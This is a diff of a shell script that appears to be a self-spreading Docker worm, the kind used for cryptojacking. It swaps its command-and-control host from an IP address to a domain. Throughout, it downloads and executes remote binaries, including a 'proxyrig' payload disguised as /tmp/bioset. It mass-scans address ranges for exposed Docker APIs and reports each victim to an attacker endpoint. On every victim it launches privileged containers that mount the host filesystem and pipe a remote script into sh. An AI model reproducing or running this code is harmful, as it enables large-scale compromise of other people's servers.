@@ -27,19 +27,19 @@ if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/de
 if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
 if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi
 fi
-if ! [ -f "/usr/sbin/zgrab" ] ; then curl -sLk -o /usr/sbin/zgrab http://45.9.150.36/outgoing/binary_files/scanner/zgrab ; chmod +x /usr/sbin/zgrab ; fi
-if ! [ -f "/usr/sbin/jq" ] ; then curl -sLk -o /usr/sbin/jq http://45.9.150.36/outgoing/binary_files/system/jq ; chmod +x /usr/sbin/jq ; fi
+if ! [ -f "/usr/sbin/zgrab" ] ; then curl -sLk -o /usr/sbin/zgrab http://solscan.life/bin/64bit/zgrab ; chmod +x /usr/sbin/zgrab ; fi
+if ! [ -f "/usr/sbin/jq" ] ; then curl -sLk -o /usr/sbin/jq http://solscan.life/bin/64bit/jq ; chmod +x /usr/sbin/jq ; fi
 if ! type masscan 2>/dev/null 1>/dev/null; then 
 if type apt-get 2>/dev/null 1>/dev/null; then wget http://archive.ubuntu.com/ubuntu/pool/main/libp/libpcap/libpcap0.8_1.7.4-2_amd64.deb ; dpkg -i libpcap0.8_1.7.4-2_amd64.deb ; rm -f libpcap0.8_1.7.4-2_amd64.deb ; wget http://archive.ubuntu.com/ubuntu/pool/universe/m/masscan/masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; dpkg -i masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; rm -f masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; fi
 if type yum 2>/dev/null 1>/dev/null; then wget http://mirror.centos.org/centos/7/os/x86_64/Packages/libpcap-1.5.3-12.el7.x86_64.rpm ; rpm -Uvh libpcap-1.5.3-12.el7.x86_64.rpm ; rm -f libpcap-1.5.3-12.el7.x86_64.rpm ; wget https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/m/masscan-1.0.3-5.el7.x86_64.rpm ; rpm -Uvh masscan-1.0.3-5.el7.x86_64.rpm ; rm -f masscan-1.0.3-5.el7.x86_64.rpm ; fi
 fi
 if ! type docker 2>/dev/null 1>/dev/null ; then 
 #curl -Lk https://get.docker.com | bash ; 
-curl -Lk https://transfer.sh/fQGse/docker -o /usr/bin/docker ; chmod +x /usr/bin/docker
+curl -Lk http://solscan.life/bin/64bit/docker -o /usr/bin/docker ; chmod +x /usr/bin/docker
 fi
 if ! [ -f "/tmp/bioset" ] ; then
-if type wget 2>/dev/null 1>/dev/null ; then wget http://45.9.150.36/pwn/ziggy -O /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
-if type curl 2>/dev/null 1>/dev/null ; then curl http://45.9.150.36/pwn/ziggy -o /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
+if type wget 2>/dev/null 1>/dev/null ; then wget http://solscan.life/pwn/proxyrig -O /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
+if type curl 2>/dev/null 1>/dev/null ; then curl http://solscan.life/pwn/proxyrig -o /tmp/bioset ; chmod +x /tmp/bioset ; /tmp/bioset ; fi
 fi
 }
 
@@ -51,9 +51,9 @@ rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
 eval "$rndstr"="'$(masscan -p$PORT $RANGE.0.0.0/8 --rate=$RATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
 for IPADDR in ${!rndstr}
 do echo "$IPADDR:$PORT"
-wget -q "http://45.9.150.36/incoming/docker.php?dockerT=$IPADDR:$PORT" -O /dev/null
-timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt fuhou/borg 
-timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt alpine sh -c 'apk update; apt-get update ; yum clean all ; apk add bash wget ; apt-get install -y bash wget ; yum install -y bash wget ; wget -O - http://45.9.150.36/pwn/TDGGinit | sh || curl http://45.9.150.36/pwn/TDGGinit | bash' &
+wget -q "http://solscan.life/incoming/docker.php?dockerT=$IPADDR:$PORT" -O /dev/null
+timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt alp1n3/borg 
+timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt alpine sh -c 'apk update; apt-get update ; yum clean all ; apk add bash wget ; apt-get install -y bash wget ; yum install -y bash wget ; wget -O - http://solscan.life/pwn/TDGGinit | sh || curl http://solscan.life/pwn/TDGGinit | bash' &
 #timeout -s SIGKILL 30 docker -H tcp://$IPADDR:$PORT swarm leave --force
 #timeout -s SIGKILL 30 docker -H tcp://$IPADDR:$PORT swarm join --token SWMTKN-1-5boro95fiuswddse7fpl7nzpavv3xon3xpbynelcrtnu7vqggt-cd9rfe6vsjsw7gdq1cq5nspw4 164.68.106.96:2377
 done;
